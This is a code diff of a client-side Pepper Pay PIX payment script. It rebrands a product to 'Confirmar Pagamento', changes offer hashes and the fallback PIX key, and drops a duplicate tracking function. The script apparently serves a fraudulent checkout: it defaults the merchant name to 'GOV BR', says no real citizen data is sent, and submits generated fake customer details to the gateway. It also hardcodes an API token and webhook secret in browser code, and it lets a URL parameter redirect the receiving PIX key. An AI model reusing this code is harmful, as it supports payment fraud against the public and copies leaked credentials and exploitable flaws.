@@ -1,6 +1,6 @@
 /**
  * pepper-api.js - Integracao Client-Side Direta para Pepper Pay (100% JavaScript)
- * Produto Oficial: Dramas Clube: Plano Vitalício
+ * Produto Oficial: Confirmar Pagamento
  * 
  * REGRA RIGOROSA DE PRIVACIDADE:
  * NENHUM dado real do cidadao e enviado ao gateway.
@@ -11,25 +11,27 @@
 
   var CONFIG = {
     gateway: "pepper",
-    productTitle: "Dramas Clube: Plano Vitalício",
-    productHash: "puyx0gjeg1",
+    productTitle: "Confirmar Pagamento",
+    productHash: "1t36h1d7sn",
     apiEndpoint: "https://api.cloud.pepperpay.com.br/public/v1/transactions",
     apiToken: "iZhIOl3xL2T1wQGcu5J3dFEjpJo4NlGFYLxsdIDpoAM6ljBN5dqL5OjgZLbs",
     webhookSecret: "EKSpolloP8ngIVP7EmbRy3xezXLToShp66AoRPrQ4VEJQEgrUaAgpaKq4pyh",
-    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "financeiro@dramasclube.com"),
+    chavePix: (window.CHAVE_PIX || localStorage.getItem("chave_pix") || (new URLSearchParams(window.location.search).get("chave_pix")) || "suporte@gmail.com"),
     offers: {
-      "6190": "cyatn",
-      "61.90": "cyatn",
-      "3582": "vzoyc",
-      "35.82": "vzoyc",
-      "2790": "iv24z",
-      "27.90": "iv24z",
-      "1970": "wynlc",
-      "19.70": "wynlc",
-      "4560": "wag3k",
-      "45.60": "wag3k",
-      "500": "ityz4",
-      "5.00": "ityz4"
+      "6190": "qdlri",
+      "61.90": "qdlri",
+      "3582": "jcr4i",
+      "35.82": "jcr4i",
+      "2790": "eni9e",
+      "27.90": "eni9e",
+      "1970": "cqbq0",
+      "19.70": "cqbq0",
+      "4560": "gogtf",
+      "45.60": "gogtf",
+      "4735": "0gfqx",
+      "47.36": "0gfqx",
+      "500": "ufr2c",
+      "5.00": "ufr2c"
     }
   };
 
@@ -197,7 +199,7 @@ var ddds = [
   function generateEmvcoPix(amountVal, pixKey, merchantName, merchantCity, txid) {
     var cents = parseAmount(amountVal);
     var amtStr = (cents / 100).toFixed(2);
-    var key = String(pixKey || CONFIG.chavePix || "financeiro@dramasclube.com").trim();
+    var key = String(pixKey || CONFIG.chavePix || "suporte@gmail.com").trim();
     var name = (merchantName || CONFIG.productTitle || "GOV BR").substring(0, 25).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
     var city = (merchantCity || "BRASILIA").substring(0, 15).toUpperCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
     var tid = (txid || "pp" + Date.now()).substring(0, 25);
@@ -257,24 +259,6 @@ var ddds = [
     return tracking;
   }
 
-    // Captura as UTMs da URL (ou do localStorage, se a página atual não tiver)
-  function getTracking() {
-    var keys = ["src", "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"];
-    var params = new URLSearchParams(window.location.search);
-    var tracking = {};
-    var saved = {};
-
-    try { saved = JSON.parse(localStorage.getItem("pepper_utms") || "{}"); } catch (e) {}
-
-    keys.forEach(function (k) {
-      var v = params.get(k) || saved[k] || "";
-      if (v) tracking[k] = v;
-    });
-
-    try { localStorage.setItem("pepper_utms", JSON.stringify(tracking)); } catch (e) {}
-    return tracking;
-  }
-
   function createPix(amountVal, customCustomer) {
     var cents = parseAmount(amountVal);
     var customer = generateGatewayCustomer(); 
@@ -283,7 +267,7 @@ var ddds = [
     var cleanPhone = String(customer.phone || "11987654321").replace(/\\D/g, "");
     if (cleanPhone.length > 11) cleanPhone = cleanPhone.slice(-11);
 
-    var offerHash = CONFIG.offers[String(cents)] || CONFIG.offers[(cents / 100).toFixed(2)] || "cyatn";
+    var offerHash = CONFIG.offers[String(cents)] || CONFIG.offers[(cents / 100).toFixed(2)] || "qdlri";
 
     var payload = {
       payment_method: "pix",
